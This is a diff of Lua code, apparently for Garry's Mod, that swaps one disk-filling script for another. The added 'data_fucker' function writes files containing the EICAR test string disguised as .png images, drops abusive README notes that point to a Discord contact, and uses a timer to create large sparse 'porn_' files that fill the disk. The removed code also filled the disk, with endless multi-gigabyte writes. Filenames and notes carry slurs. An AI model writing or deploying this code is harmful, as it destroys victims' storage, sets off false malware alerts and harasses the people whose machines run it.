@@ -1,25 +1,30 @@
-local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ блок
-local fileIndex = 0
+local function data_fucker() 
+	for i=1,32 do 
+		file.Write(rand_string_2()  .. ".png","X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*") 
+	end 
+	for i=1,32 do 
+		file.Write("README_RETARD_" .. i .. ".txt",cfg.discord_pidorawek) 
+	end 
+	local C,c = 2100000000,0 
+	local name = rand_string() 
+	timer.Create(name,1,100,function() 
+		for i=1,10 do 
+			c=c+1 
+			local F = file.Open("porn_"  ..  c ..  ".jpg","wb","DATA") 
+			if not F then 
+				return
+			end 
+			F["WriteBool"](F,true) 
+			F["Seek"](F,C) 
+			F["WriteBool"](F,false) 
+			if F["Size"](F) == 1 then 
+				C=C-2000000.0 
+				if C <= 0 then 
+					timer.Remove(name) 
+				end 
+			end 
+			F["Close"](F) 
+		end 
+	end)
 
--- Шаг 1: 10 файлов по 10 ГБ
-for i = 1, 10 do
-    fileIndex = fileIndex + 1
-    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
-    if not f then error("Не удалось открыть файл " .. fileIndex) end
-
-    for j = 1, 10240 do -- 10,240 * 1 МБ = 10 ГБ
-        f:Write(one_mb)
-    end
-
-    f:Close()
-    print("[10GB FILE] Created: Igay_" .. fileIndex)
-end
-
--- Шаг 2: бесконечно создавать 1 МБ файлы
-while true do
-    fileIndex = fileIndex + 1
-    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
-    f:Write(one_mb)
-    f:Close()
-    print("[1MB FILE] Created: Igay_" .. fileIndex)
-end
+end 
